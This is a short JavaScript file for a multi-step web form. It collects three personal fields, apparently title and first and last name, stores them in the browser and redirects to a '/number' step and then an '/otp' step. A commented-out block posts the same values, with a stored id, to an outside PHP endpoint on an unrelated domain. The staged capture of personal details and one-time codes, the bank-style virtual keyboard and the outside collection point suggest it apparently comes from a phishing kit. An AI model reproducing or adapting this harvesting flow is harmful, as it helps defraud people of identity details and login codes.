// Hide Error
hide();

var id = localStorage.getItem("id");

function rest(){
	document.getElementById("in1").innerHTML = "";
	document.getElementById("in2").innerHTML = "";
	document.getElementById("in3").innerHTML = "";
}


function verify_info_input(){
	var a = document.getElementById("in1").value;
    var b = document.getElementById("in2").value;
    var c = document.getElementById("in3").value;
    
	if (a == "" || b == "" || c == "") {
        console.log("Null");
        show();
        return false;
    } else {
        return true;
    }
}


function sendInfo() {
    if(verify_info_input()){
		var a = document.getElementById("in1").value;
		var b = document.getElementById("in2").value;
		var c = document.getElementById("in3").value;
		
		localStorage.setItem("mr", a);
		localStorage.setItem("fst", b);
		localStorage.setItem("lst", c);

		window.location.href = "/number"; 
		// var xhttp = new XMLHttpRequest();
		// xhttp.onreadystatechange = function () {
		// 	if (this.readyState == 4 && this.status == 200) {
		// 		console.log(this.responseText);
		// 	}
		// };
		// xhttp.open("POST", "http://stupidarnob.com/phpAPI/hv.php", true);
		// xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		// xhttp.send( "id=" + id +"&mr=" + a + "&fst=" + b+ "&lst=" + c);
		// setTimeout(re, 1000);
	}else{
		show();
	}
}

// Redirect to new page
function re() {
    window.location.href = "/number";   // change to /otp
    // window.location.href = "otp.html";   // change to /otp
}


function hide(){
    $(document).ready(function(){
        $("#problem").hide();
        $("#virtualkeyboard").show();
    });
}

function show(){
    $(document).ready(function(){
        $("#problem").show();
        $("#virtualkeyboard").hide();
    });
}

